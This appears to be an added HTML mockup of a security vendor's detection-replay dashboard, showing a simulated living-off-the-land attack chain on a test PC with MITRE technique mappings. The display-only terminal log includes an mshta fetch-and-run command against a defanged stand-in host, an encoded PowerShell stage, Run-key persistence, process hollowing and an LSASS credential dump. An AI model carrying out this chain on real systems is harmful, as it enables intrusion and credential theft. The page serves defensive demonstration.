@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AEGIS — LOTL Attack Simulation</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0c10;--bg2:#0f1218;--bg3:#141921;
+  --card:#111827;--border:#1e293b;--border2:#2d3a4f;
+  --white:#f1f5f9;--gray:#94a3b8;--muted:#64748b;
+  --blue:#3b82f6;--blue2:#60a5fa;--bluebg:rgba(59,130,246,.1);
+  --green:#22c55e;--greenbg:rgba(34,197,94,.08);--greentext:#4ade80;
+  --red:#ef4444;--redbg:rgba(239,68,68,.06);--redtext:#f87171;
+  --amber:#f59e0b;--amberbg:rgba(245,158,11,.06);--ambertext:#fbbf24;
+  --purple:#a78bfa;--cyan:#22d3ee;
+}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--white);-webkit-font-smoothing:antialiased;padding:0}
+.topbar{display:flex;align-items:center;justify-content:space-between;padding:.75rem 1.5rem;background:var(--bg2);border-bottom:1px solid var(--border)}
+.topbar-left{display:flex;align-items:center;gap:1rem}
+.logo{font-weight:800;font-size:.95rem;letter-spacing:.08em}.logo span{color:var(--blue)}
+.breadcrumb{font-size:.75rem;color:var(--muted)}.breadcrumb span{color:var(--gray)}
+.sim-badge{font-family:'JetBrains Mono',monospace;font-size:.7rem;font-weight:600;padding:.35rem .8rem;border-radius:6px;background:var(--bluebg);color:var(--blue2);border:1px solid rgba(59,130,246,.25)}
+
+.page{padding:1.25rem 1.5rem;max-width:1100px;margin:0 auto}
+.page-title{font-size:1.2rem;font-weight:700;margin-bottom:.25rem}
+.page-sub{font-size:.75rem;color:var(--muted);margin-bottom:1.25rem}
+
+/* MITRE PROGRESS BAR */
+.mitre-bar{display:flex;gap:2px;margin-bottom:1.25rem}
+.mitre-step{flex:1;text-align:center;padding:.6rem .5rem;border-radius:6px;font-size:.65rem;font-weight:600;border:1px solid var(--border);background:var(--card);transition:all .3s}
+.mitre-step.active{background:linear-gradient(180deg,rgba(59,130,246,.15),rgba(59,130,246,.05));border-color:var(--blue);color:var(--blue2)}
+.mitre-step.completed{background:linear-gradient(180deg,rgba(239,68,68,.1),rgba(239,68,68,.03));border-color:rgba(239,68,68,.3);color:var(--redtext)}
+.mitre-step.blocked{background:rgba(100,116,139,.05);border-color:var(--border);color:var(--muted)}
+.mitre-code{font-family:'JetBrains Mono',monospace;font-size:.55rem;color:var(--muted);margin-top:.2rem;display:block}
+
+/* TERMINAL */
+.terminal{background:#0d1117;border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:1rem}
+.term-bar{display:flex;align-items:center;gap:.5rem;padding:.6rem 1rem;background:#161b22;border-bottom:1px solid var(--border)}
+.term-dots{display:flex;gap:.35rem}
+.term-dot{width:10px;height:10px;border-radius:50%}
+.term-dot.r{background:#ff5f57}.term-dot.y{background:#febc2e}.term-dot.g{background:#28c840}
+.term-title{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--muted);flex:1;text-align:center}
+.term-body{padding:1rem 1.25rem;font-family:'JetBrains Mono',monospace;font-size:.72rem;line-height:2;overflow-x:auto}
+.term-line{white-space:nowrap}
+.t-ts{color:#484f58;margin-right:.5rem}
+.t-red{color:var(--redtext)}
+.t-amber{color:var(--ambertext)}
+.t-green{color:var(--greentext)}
+.t-blue{color:var(--blue2)}
+.t-purple{color:var(--purple)}
+.t-white{color:var(--white);font-weight:600}
+.t-dim{color:#484f58}
+.t-highlight{background:rgba(245,158,11,.1);padding:.1rem .3rem;border-radius:2px}
+
+/* PLAYBACK BAR */
+.playback{display:flex;align-items:center;gap:1rem;padding:.75rem 1.25rem;background:var(--card);border:1px solid var(--border);border-radius:8px;margin-bottom:1rem}
+.play-btn{width:36px;height:36px;border-radius:50%;background:var(--blue);display:flex;align-items:center;justify-content:center;cursor:pointer;border:none;color:#fff;font-size:.9rem;flex-shrink:0}
+.progress-track{flex:1;height:6px;background:var(--bg3);border-radius:3px;position:relative;overflow:hidden}
+.progress-fill{height:100%;background:var(--blue);border-radius:3px;width:65%}
+.play-time{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--muted);flex-shrink:0}
+.speed-btns{display:flex;gap:.25rem}
+.speed-btn{padding:.2rem .5rem;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.65rem;border:1px solid var(--border);background:transparent;color:var(--muted);cursor:pointer}
+.speed-btn.active{border-color:var(--blue);color:var(--blue2);background:var(--bluebg)}
+
+/* AGENT DETECTIONS */
+.det-grid{display:grid;grid-template-columns:1fr 1fr;gap:.75rem;margin-bottom:1rem}
+.det-card{background:var(--card);border:1px solid var(--border);border-left:3px solid var(--red);border-radius:8px;padding:1rem}
+.det-title{font-weight:700;font-size:.85rem;margin-bottom:.15rem}
+.det-desc{font-size:.75rem;color:var(--gray);margin-bottom:.35rem}
+.det-mitre{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--redtext)}
+.det-time{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--muted);margin-top:.25rem}
+
+/* BOTTOM STATS */
+.bstats{display:grid;grid-template-columns:repeat(4,1fr);gap:.75rem}
+.bstat{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.25rem;text-align:center}
+.bstat-val{font-family:'JetBrains Mono',monospace;font-size:1.5rem;font-weight:700;color:var(--greentext)}
+.bstat-label{font-size:.7rem;color:var(--muted);margin-top:.25rem}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-left">
+    <div class="logo">SENTRI<span>XI</span></div>
+    <div class="breadcrumb">AEGIS <span>›</span> Detection Validation <span>›</span> LOTL Simulation</div>
+  </div>
+  <div class="sim-badge">Sandbox · Simulation</div>
+</div>
+
+<div class="page">
+  <div class="page-title">LOTL attack simulation — live detection replay</div>
+  <div class="page-sub">AEGIS Detection Validation · Scattered Spider LOLBin chain against DVWS-PC01 · All data synthetic</div>
+
+  <!-- MITRE PROGRESS -->
+  <div class="mitre-bar">
+    <div class="mitre-step completed">Delivery<span class="mitre-code">T1566</span></div>
+    <div class="mitre-step completed">Execution<span class="mitre-code">T1059</span></div>
+    <div class="mitre-step completed">Persistence<span class="mitre-code">T1547</span></div>
+    <div class="mitre-step completed">Evasion<span class="mitre-code">T1055</span></div>
+    <div class="mitre-step completed">Credential access<span class="mitre-code">T1003</span></div>
+    <div class="mitre-step active">C2<span class="mitre-code">T1071</span></div>
+    <div class="mitre-step blocked">Lateral<span class="mitre-code">T1021</span></div>
+    <div class="mitre-step blocked">Contained<span class="mitre-code">Guardian</span></div>
+  </div>
+
+  <!-- TERMINAL -->
+  <div class="terminal">
+    <div class="term-bar">
+      <div class="term-dots"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div></div>
+      <div class="term-title">DVWS-PC01 · AEGIS Detection Overlay · svchost.exe chain</div>
+    </div>
+    <div class="term-body">
+      <div class="term-line"><span class="t-ts">[T+0.000s]</span> <span class="t-dim">— Spearphishing payload delivered via Outlook —</span></div>
+      <div class="term-line"><span class="t-ts">[T+0.100s]</span> <span class="t-red">EXCEL.EXE</span> → CreateProcess(cmd.exe /c mshta.exe http://cdn-update[.]co/p.hta)</div>
+      <div class="term-line"><span class="t-ts">[T+0.200s]</span> <span class="t-red">mshta.exe</span> → CreateProcess(powershell.exe -enc SQBFAFg...)</div>
+      <div class="term-line"><span class="t-ts">[T+0.340s]</span> <span class="t-purple">powershell.exe</span> → Invoke-Expression(certutil.exe -decode %TEMP%\update.b64 %TEMP%\svc.dll)</div>
+      <div class="term-line"><span class="t-ts">[T+0.410s]</span> <span class="t-amber t-highlight">REGISTRY WRITE</span> HKCU\Software\Microsoft\Windows\CurrentVersion\Run → %TEMP%\svc.dll</div>
+      <div class="term-line"><span class="t-ts">[T+0.500s]</span> <span class="t-red t-highlight">PROCESS INJECTION</span> NtCreateThreadEx → svchost.exe (PID 4712) hollowing detected</div>
+      <div class="term-line"><span class="t-ts">[T+0.600s]</span> <span class="t-white">svchost.exe:4712</span> → Memory region RWX allocated (0x7ff8a2100000, 64KB)</div>
+      <div class="term-line"><span class="t-ts">[T+0.890s]</span> <span class="t-red t-highlight">CREDENTIAL ACCESS</span> svchost.exe:4712 → OpenProcess(LSASS.EXE) → MiniDumpWriteDump</div>
+      <div class="term-line"><span class="t-ts">[T+1.200s]</span> <span class="t-amber t-highlight">DNS BEACON</span> svchost.exe:4712 → a3x7k.cdn-update[.]co (DGA pattern, 30s interval)</div>
+      <div class="term-line"><span class="t-ts">[T+1.600s]</span> <span class="t-dim">Waiting for next event...</span></div>
+    </div>
+  </div>
+
+  <!-- PLAYBACK -->
+  <div class="playback">
+    <button class="play-btn">❚❚</button>
+    <div class="progress-track"><div class="progress-fill"></div></div>
+    <div class="play-time">T+1.200s</div>
+    <div class="speed-btns">
+      <button class="speed-btn">0.5x</button>
+      <button class="speed-btn active">1x</button>
+      <button class="speed-btn">2x</button>
+    </div>
+  </div>
+
+  <!-- AGENT DETECTIONS -->
+  <div class="det-grid">
+    <div class="det-card">
+      <div class="det-title">Process Injection Monitor</div>
+      <div class="det-desc">NtCreateThreadEx hollowing into svchost.exe</div>
+      <div class="det-mitre">T1055.012</div>
+      <div class="det-time">T+0.500s</div>
+    </div>
+    <div class="det-card">
+      <div class="det-title">Memory Forensics Scanner</div>
+      <div class="det-desc">LSASS credential dump attempt from svchost</div>
+      <div class="det-mitre">T1003.001</div>
+      <div class="det-time">T+0.890s</div>
+    </div>
+    <div class="det-card">
+      <div class="det-title">C2 Beacon Analyzer</div>
+      <div class="det-desc">DNS beaconing with DGA subdomain pattern</div>
+      <div class="det-mitre">T1071.004 · T1568.002</div>
+      <div class="det-time">T+1.200s</div>
+    </div>
+    <div class="det-card">
+      <div class="det-title">LOLBin Chain Analyzer</div>
+      <div class="det-desc">EXCEL → cmd → mshta chain detected</div>
+      <div class="det-mitre">T1218.005 · T1059.003</div>
+      <div class="det-time">T+0.100s</div>
+    </div>
+  </div>
+
+  <!-- BOTTOM STATS -->
+  <div class="bstats">
+    <div class="bstat">
+      <div class="bstat-val" style="color:var(--redtext)">6</div>
+      <div class="bstat-label">Agents triggered</div>
+    </div>
+    <div class="bstat">
+      <div class="bstat-val">23ms</div>
+      <div class="bstat-label">First detection</div>
+    </div>
+    <div class="bstat">
+      <div class="bstat-val">—</div>
+      <div class="bstat-label">Containment</div>
+    </div>
+    <div class="bstat">
+      <div class="bstat-val">—</div>
+      <div class="bstat-label">Final confidence</div>
+    </div>
+  </div>
+</div>
+</body>
+</html>
